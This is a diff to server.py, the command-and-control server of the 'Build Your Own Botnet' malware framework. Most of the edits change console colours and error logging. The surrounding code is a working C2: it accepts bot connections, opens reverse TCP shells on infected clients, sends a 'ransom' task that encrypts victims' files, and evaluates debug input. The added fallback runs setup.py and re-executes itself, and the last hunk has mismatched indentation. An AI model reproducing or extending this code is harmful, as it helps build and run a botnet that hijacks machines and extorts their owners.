@@ -1,7 +1,6 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
-""" 
-Command & Control (Build Your Own Botnet)
+"""Command & Control (Build Your Own Botnet)
 
 88                                  88
 88                                  88
@@ -34,13 +33,6 @@ import threading
 import subprocess
 import collections
 
-# packages
-try:
-    import colorama
-    colorama.init(autoreset=False)
-except:
-    pass
-
 # modules
 from core import *
 
@@ -56,9 +48,18 @@ util.imports(packages, __builtins__)
 __threads = {}
 __abort = False
 __debug = bool('--debug' in sys.argv)
-__logger = logging.getLogger(__name__)
-logging.basicConfig(level=logging.DEBUG if globals()['__debug'] else logging.INFO, handler=logging.StreamHandler())
+try:
+    import colorama
+    colorama.init(autoreset=True)
+#    print(random.choice(filter(str.isupper, dir(colorama.Fore))) + __doc__)
+    print(colorama.Fore.RED + colorama.Style.NORMAL + __doc__)
+except ImportError:
+   util.__logger__.debug("installing required Python package 'colorama'...")
+   execfile('setup.py')
+   util.__logger__.debug("restarting...")
+   os.execv(sys.executable, ['python'] + [os.path.abspath(sys.argv[0])] + sys.argv[1:])
 
+# main
 def main():
     parser = argparse.ArgumentParser(
         prog='server.py',
@@ -92,6 +93,7 @@ def main():
     globals()['c2'] = C2(host=options.host, port=options.port, db=options.db)
     c2.run()
 
+
 class C2():
     """ 
     Console-based command & control server with a streamlined user-interface for controlling clients
@@ -103,9 +105,9 @@ class C2():
     """
 
     _lock = threading.Lock()
-    _text_color = 'RED'
-    _text_style = 'DIM'
-    _prompt_color = 'RESET'
+    _text_color = 'WHITE'
+    _text_style = 'NORMAL'
+    _prompt_color = 'WHITE'
     _prompt_style = 'BRIGHT'
 
     def __init__(self, host='0.0.0.0', port=1337, db=':memory:'):
@@ -159,8 +161,8 @@ class C2():
     def _error(self, data):
         lock = self.current_session._lock if self.current_session else self._lock
         with lock:
-            util.display('[-] ', color='red', style='dim', end=',')
-            util.display('Server Error: {}\n'.format(data), color='reset', style='dim')
+            util.display('[-] ', color='red', style='normal', end=',')
+            util.display('Server Error: {}\n'.format(data), color='white', style='normal')
 
     def _print(self, info):
         lock = self.current_session._lock if self.current_session else self._lock
@@ -207,10 +209,10 @@ class C2():
             with self._lock:
                 util.display(banner, color=random.choice(['red','green','cyan','magenta','yellow']), style='bright')
                 util.display("[?] ", color='yellow', style='bright', end=',')
-                util.display("Hint: show usage information with the 'help' command\n", color='reset', style='dim')
+                util.display("Hint: show usage information with the 'help' command\n", color='white', style='normal')
             return banner
         except Exception as e:
-            self._error(str(e))
+            util.__logger__.error(str(e))
 
     def _get_arguments(self, data):
         args = tuple([i for i in data.split() if '=' not in i])
@@ -227,7 +229,7 @@ class C2():
         elif self.current_session:
             session = self.current_session
         else:
-            self._error("Invalid Client ID")
+            util.__logger__.error("Invalid Client ID")
         return session
 
     def _get_session_by_connection(self, connection):
@@ -239,7 +241,7 @@ class C2():
                     session = c
                     break
         else:
-            self._error("Invalid input type (expected '{}', received '{}')".format(socket.socket, type(connection)))
+            util.__logger__.error("Invalid input type (expected '{}', received '{}')".format(socket.socket, type(connection)))
         return session
 
     def _get_prompt(self, data):
@@ -258,9 +260,9 @@ class C2():
             try:
                 print eval(code)
             except Exception as e:
-                self._error("Error: %s" % str(e))
+                util.__logger__.error("Error: %s" % str(e))
         else:
-            self._error("Debugging mode is disabled")
+            util.__logger__.error("Debugging mode is disabled")
 
     def quit(self):
         """ 
@@ -322,7 +324,7 @@ class C2():
                 except:
                     util.display(str(info), color=self._text_color, style=self._text_style)
             else:
-                self._error("{} error: invalid data type '{}'".format(self.display.func_name, type(info)))
+                util.__logger__.error("{} error: invalid data type '{}'".format(self.display.func_name, type(info)))
 
     def query(self, statement):
         """ 
@@ -343,10 +345,10 @@ class C2():
         text_style = [style for style in filter(str.isupper, dir(colorama.Style)) if style == self._text_style][0]
         prompt_color = [color for color in filter(str.isupper, dir(colorama.Fore)) if color == self._prompt_color][0]
         prompt_style = [style for style in filter(str.isupper, dir(colorama.Style)) if style == self._prompt_style][0]
-        util.display('\n\t    SETTINGS', color='reset', style='bright')
+        util.display('\n\t    SETTINGS', color='white', style='bright')
         util.display('\ttext color/style', color=self._text_color, style=self._text_style)
         util.display('\tprompt color/style', color=self._prompt_color, style=self._prompt_style)
-        util.display('\tdebug: {}\n'.format('true' if globals()['__debug'] else 'false'), color='reset', style='dim')
+        util.display('\tdebug: {}\n'.format('true' if globals()['__debug'] else 'false'), color='white', style='normal')
 
     def set(self, args=None):
         """ 
@@ -380,8 +382,8 @@ class C2():
                             globals()['__debug'] = False
                         elif setting.lower() in ('1','on','true','enable'):
                             globals()['__debug'] = True
-                        util.display("\n[+]" if globals()['__debug'] else "\n[-]", color='green' if globals()['__debug'] else 'red', style='dim', end=',')
-                        util.display("Debug: {}\n".format("ON" if globals()['__debug'] else "OFF"), color='reset', style='bright')
+                        util.display("\n[+]" if globals()['__debug'] else "\n[-]", color='green' if globals()['__debug'] else 'red', style='normal', end=',')
+                        util.display("Debug: {}\n".format("ON" if globals()['__debug'] else "OFF"), color='white', style='bright')
                         return
                 for setting, option in arguments.kwargs.items():
                     option = option.upper()
@@ -392,7 +394,7 @@ class C2():
                         elif setting == 'style':
                             if hasattr(colorama.Style, option):
                                 self._prompt_style = option
-                        util.display("\nprompt color/style changed to ", color='reset', style='bright', end=',')
+                        util.display("\nprompt color/style changed to ", color='white', style='bright', end=',')
                         util.display(option + '\n', color=self._prompt_color, style=self._prompt_style)
                         return
                     elif target == 'text':
@@ -402,7 +404,7 @@ class C2():
                         elif setting == 'style':
                             if hasattr(colorama.Style, option):
                                 self._text_style = option
-                        util.display("\ntext color/style changed to ", color='reset', style='bright', end=',')
+                        util.display("\ntext color/style changed to ", color='white', style='bright', end=',')
                         util.display(option + '\n', color=self._text_color, style=self._text_style)
                         return
         util.display("\nusage: set [setting] [option]=[value]\n\n    colors:   white/black/red/yellow/green/cyan/magenta\n    styles:   dim/normal/bright\n", color=self._text_color, style=self._text_style)
@@ -441,7 +443,7 @@ class C2():
 
         """
         if not self.current_session:
-            self._error( "No client selected")
+            util.__logger__.error( "No client selected")
             return
         client = self.current_session
         result = ''
@@ -563,9 +565,9 @@ class C2():
             elif 'encrypt' in str(args):
                 self.current_session.send_task("ransom %s" % args)
             else:
-                self._error("Error: invalid option '%s'" % args)
+                util.__logger__.error("Error: invalid option '%s'" % args)
         else:
-            self._error("No client selected")
+            util.__logger__.error("No client selected")
 
     def session_shell(self, session):
         """ 
@@ -576,13 +578,13 @@ class C2():
 
         """
         if not str(session).isdigit() or int(session) not in self.sessions:
-            self._error("Session '{}' does not exist".format(session))
+            util.__logger__.error("Session '{}' does not exist".format(session))
         else:
             self._active.clear()
             if self.current_session:
                 self.current_session._active.clear()
             self.current_session = self.sessions[int(session)]
-            util.display("\n\nStarting Reverse TCP Shell w/ Session {}...\n".format(self.current_session.id), color='reset', style='dim')
+            util.display("\n\nStarting Reverse TCP Shell w/ Session {}...\n".format(self.current_session.id), color='white', style='normal')
             self.current_session._active.set()
             return self.current_session.run()
 
@@ -612,15 +614,14 @@ class C2():
             if isinstance(info, dict):
                 session.info = info
             self.sessions[self._count] = session
-            self.sessions[self._count].start()
             self._count += 1
             util.display("\n\n\t[+]", color='green', style='bright', end=',')
-            util.display("New Connection:", color='reset', style='bright', end=',')
-            util.display(address[0], color='reset', style='dim')
-            util.display("\t    Session:", color='reset', style='bright', end=',')
-            util.display(str(self._count), color='reset', style='dim')
-            util.display("\t    Started:", color='reset', style='bright', end=',')
-            util.display(time.ctime(session._created) + "\n", color='reset', style='dim')
+            util.display("New Connection:", color='white', style='bright', end=',')
+            util.display(address[0], color='white', style='normal')
+            util.display("\t    Session:", color='white', style='bright', end=',')
+            util.display(str(self._count), color='white', style='normal')
+            util.display("\t    Started:", color='white', style='bright', end=',')
+            util.display(time.ctime(session._created) + "\n", color='white', style='normal')
             prompt = self.current_session._prompt if self.current_session else self._prompt
             util.display(prompt, color=self._prompt_color, style=self._prompt_style, end=',')
             abort = globals()['__abort']
@@ -815,7 +816,8 @@ class Session(threading.Thread):
                             break
                     self._prompt = None
             except Exception as e:
-                globals()['c2']._error(str(e))
+		util.__logger__.error(str(e))
+		globals()['c2'].session_remove(self.id)
                 time.sleep(1)
                 break
         self._active.clear()
